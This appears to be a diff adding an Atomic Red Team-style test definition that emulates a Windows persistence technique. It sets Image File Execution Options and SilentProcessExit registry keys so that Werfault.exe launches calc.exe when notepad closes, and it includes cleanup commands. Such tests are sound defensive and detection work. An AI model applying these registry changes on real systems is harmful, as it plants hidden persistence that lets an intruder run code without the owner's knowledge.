@@ -1,0 +1,22 @@
+attack_technique: TA0003
+display_name: Werfault.exe Utilizing SilentProcessExit to Achieve Persistence 
+atomic_tests:
+- name: Werfault.exe Utilizing SilentProcessExit to Achieve Persistence
+  auto_generated_guid: 5a1cf5cf-074f-4c6d-8039-c9335edf168f
+  description: configuration modifications to SilentProcessExit. SilentProcessExit is a Windows feature that allows Werfault.exe to launch any specified process or command when a configured process terminates. This test will configure calc.exe to open when ever notepad is closed
+  supported_platforms:
+  - windows
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Start-Process notepad
+      reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+      reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
+      reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
+      Stop-Process -ProcessName "notepad" -Force
+    cleanup_command: |
+      Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" -Force -ErrorAction SilentlyContinue
+    
